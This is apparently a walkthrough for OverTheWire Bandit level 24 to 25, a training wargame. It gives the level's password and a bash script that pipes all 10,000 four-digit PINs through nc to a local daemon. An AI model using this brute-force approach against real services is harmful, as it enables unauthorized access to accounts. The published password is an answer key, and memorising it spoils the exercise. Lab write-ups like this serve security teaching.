## Level 24 → Level 25

### Objective:
A daemon is listening on port `30002` and will give you the password for `bandit25` if given the password for `bandit24` and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by brute-forcing all of the 10000 combinations.

### SSH Credentials for Level 24:
- **Username**: `bandit24@bandit.labs.overthewire.org`
- **Password**: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8` (output from level 23)

### Steps:

1. Create a temporary directory to store the files:
    ```bash
    mktemp -d
    cd /tmp/tmp.wnYESn8iWY
    ```

2. Create a shell script to brute-force the pincode:
    ```bash
    nano script.sh
    ```
    - Inside the script, write the following:
    ```bash
    #!/bin/bash
    for i in {0000..9999}; do
        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> possibilities.txt
    done

    cat possibilities.txt | nc localhost 30002 > result.txt
    ```

3. Make your script executable:
    ```bash
    chmod +x script.sh
    ```

4. Run the script to send all the possible combinations to the daemon:
    ```bash
    ./script.sh
    ```

5. After the script finishes running, check the `result.txt` file for the password for `bandit25`:
    ```bash
    cat result.txt
    ```

6. Use the `exit` command to log out from `bandit24`:
    ```bash
    exit
    ```

---

### Happy Hacking!
